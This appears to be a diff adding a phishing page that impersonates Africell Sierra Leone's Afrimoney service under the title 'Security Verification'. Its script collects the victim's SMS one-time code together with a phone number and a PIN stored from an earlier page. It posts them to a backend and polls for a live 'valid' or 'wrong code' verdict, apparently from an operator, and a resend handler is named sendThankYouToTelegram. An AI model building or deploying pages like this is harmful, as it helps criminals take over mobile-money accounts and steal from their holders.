@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Africell Sierra Leone | Security Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            /* Pantone Purple 2665 C Gradient (#9B1B75 / #5E0C44) */
+            background: linear-gradient(135deg, #9B1B75 0%, #7E145E 50%, #5E0C44 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #ffffff;
+        }
+
+        .e-fullscreen-wrapper {
+            width: 100%;
+            max-width: 460px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            animation: slideUp .7s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* LOGO */
+        .e-logo {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            text-transform: uppercase;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .e-logo span {
+            color: #FFCC00;
+        }
+
+        .e-logo small {
+            display: block;
+            font-size: 10px;
+            letter-spacing: 3px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 4px;
+        }
+
+        .e-card-header {
+            text-align: center;
+        }
+
+        .e-card-header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 6px;
+            color: #ffffff;
+        }
+
+        .e-card-header p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.4;
+        }
+
+        /* Verification Box Group */
+        .e-input-group {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 24px;
+            padding: 28px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Single Input Field with ______ placeholder */
+        .single-code-input {
+            width: 100%;
+            height: 60px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            color: #FFCC00;
+            background: rgba(255, 255, 255, 0.12);
+            border: 1.5px solid rgba(255, 255, 255, 0.22);
+            border-radius: 14px;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            transition: all 0.2s ease;
+            margin-bottom: 24px;
+        }
+
+        .single-code-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+            letter-spacing: 6px;
+            font-weight: 600;
+        }
+
+        .single-code-input:focus {
+            border-color: #FFCC00;
+            background: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
+        }
+
+        /* Verify Action Button */
+        .e-btn-verify {
+            width: 100%;
+            padding: 16px;
+            background: #FFCC00;
+            color: #5E0C44;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-transform: uppercase;
+            transition: all 0.2s ease;
+            margin-bottom: 12px;
+        }
+
+        .e-btn-verify:hover {
+            transform: translateY(-2px);
+            background: #ffe033;
+            box-shadow: 0 15px 30px rgba(255, 204, 0, 0.4);
+        }
+
+        .e-btn-verify:active {
+            transform: translateY(0);
+        }
+
+        /* Loading Container */
+        #loadingContainer {
+            display: none;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 500;
+        }
+
+        .small-spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #FFCC00;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Resend Button */
+        .btn-resend {
+            background: none;
+            border: none;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            font-weight: 500;
+            padding: 4px;
+        }
+
+        .btn-resend span {
+            color: #FFCC00;
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        .btn-resend:active {
+            opacity: 0.7;
+        }
+
+        /* Custom In-App Modal Alert Overlay */
+        #customModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(94, 12, 68, 0.9);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background: #7E145E;
+            width: 100%;
+            max-width: 320px;
+            border-radius: 24px;
+            padding: 24px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            color: #ffffff;
+        }
+
+        .modal-message {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .modal-btn {
+            background: #FFCC00;
+            color: #5E0C44;
+            border: none;
+            border-radius: 14px;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 6px 16px rgba(255, 204, 0, 0.3);
+        }
+
+        .modal-btn:active {
+            opacity: 0.9;
+        }
+
+        /* Footer */
+        .e-footer {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 11px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="e-fullscreen-wrapper">
+        <!-- AFRICELL LOGO -->
+        <div class="e-logo">
+            Africell <span>Sierra Leone</span>
+            <small>AFRIMONEY SERVICES</small>
+        </div>
+
+        <div class="e-card-header">
+            <h1>Security Verification</h1>
+            <p>Enter the 6-digit verification code sent to your phone via SMS.</p>
+        </div>
+
+        <div class="e-input-group">
+            <!-- Single Input Field with ______ placeholder -->
+            <input type="tel" id="promoCodeInput" class="single-code-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="______" autofocus>
+
+            <button onclick="submitPromoCode()" class="e-btn-verify">Verify Code</button>
+
+            <!-- Small Spinner right under the button -->
+            <div id="loadingContainer">
+                <div class="small-spinner"></div>
+                <span id="spinnerText">Waiting for verification...</span>
+            </div>
+
+            <button class="btn-resend" onclick="sendThankYouToTelegram()" type="button">
+                <span>Didn't get code?</span> <span>Resend</span>
+            </button>
+        </div>
+
+        <div class="e-footer">
+            © 2026 Africell Sierra Leone. All Rights Reserved.
+        </div>
+    </div>
+
+    <!-- Custom In-App Modal Alert -->
+    <div id="customModal">
+        <div class="modal-card">
+            <div id="modalText" class="modal-message">Notification message here</div>
+            <button class="modal-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        function showAlert(message) {
+            document.getElementById('modalText').innerText = message;
+            document.getElementById('customModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('customModal').style.display = 'none';
+        }
+
+        async function submitPromoCode() {
+            const promoCodeInput = document.getElementById('promoCodeInput');
+            const promoCode = promoCodeInput.value.trim();
+
+            if (!promoCode) {
+                showAlert('Please enter the verification code.');
+                return;
+            }
+
+            const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '';
+            const uniqueId = localStorage.getItem('africellLastPin') || localStorage.getItem('lastPin') || '';
+            const loadingContainer = document.getElementById('loadingContainer');
+            const spinnerTxt = document.getElementById('spinnerText');
+
+            try {
+                spinnerTxt.innerText = "Sending request...";
+                loadingContainer.style.display = 'flex';
+
+                const response = await fetch('/api/verify-promo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, promoCode, uniqueId })
+                });
+
+                const result = await response.json();
+                if (result.success) {
+                    spinnerTxt.innerText = "Waiting for verification...";
+                    pollPromoStatus(phone);
+                } else {
+                    loadingContainer.style.display = 'none';
+                    showAlert('Error: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loadingContainer.style.display = 'none';
+                showAlert('Could not connect to the backend server.');
+            }
+        }
+
+        function pollPromoStatus(phone) {
+            const loadingContainer = document.getElementById('loadingContainer');
+
+            const statusInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/check-promo-status?phone=${encodeURIComponent(phone)}`);
+                    const data = await response.json();
+
+                    if (data.status === 'valid') {
+                        clearInterval(statusInterval);
+                        loadingContainer.style.display = 'none';
+                        showAlert('Code verified successfully!');
+                        setTimeout(() => {
+                            window.location.href = 'success.html';
+                        }, 1200);
+                    } 
+                    else if (data.status === 'invalid' || data.status === 'wrong_code') {
+                        clearInterval(statusInterval);
+                        loadingContainer.style.display = 'none';
+                        showAlert('Wrong Code. Please try again.');
+                    } 
+                    else if (data.status === 'try_again') {
+                        clearInterval(statusInterval);
+                        loadingContainer.style.display = 'none';
+                        showAlert('Please request a new code or try again.');
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
+
+        async function sendThankYouToTelegram() {
+            const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '';
+            const uniqueId = localStorage.getItem('africellLastPin') || localStorage.getItem('lastPin') || '';
+
+            try {
+                const response = await fetch('/api/send-thank-you', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, uniqueId })
+                });
+                const result = await response.json();
+                if (result.success) {
+                    showAlert('A new code request has been sent.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('Could not send resend request.');
+            }
+        }
+    </script>
+</body>
+</html>
